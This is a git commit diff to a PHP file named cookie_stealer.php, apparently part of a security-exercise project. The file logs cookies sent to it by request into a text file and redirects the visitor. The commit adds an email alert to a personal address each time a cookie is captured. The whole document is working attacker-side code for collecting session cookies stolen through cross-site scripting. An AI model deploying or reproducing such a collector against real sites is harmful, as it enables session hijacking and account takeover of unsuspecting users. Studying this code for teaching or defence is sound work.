1d82f3396fb2c47e4b5ba19d1b299512ae6c9ba0
Nikolas Iliopoulos <nikolasil2000@gmail.com>
2022-05-09 23:54:10 +0300

    cookie mail

--- puppies/cookie_stealer.php
+++ puppies/cookie_stealer.php
@@ -4,6 +4,7 @@ if (isset($_REQUEST["cookie"])) {
   $fp = fopen("cookies.txt", "a+");
   fwrite($fp, $_REQUEST["cookie"] . "\n");
   fclose($fp);
+  mail("mivolakis@gmail.com", "COOKIE STEALER NEEDS ACTION", "RED ALERT: COOKIE STEALER DETECTED A COOKIE.\n RUN!!");
 }
 
 header("Location: http://kerberosclan.puppies.chatzi.org");
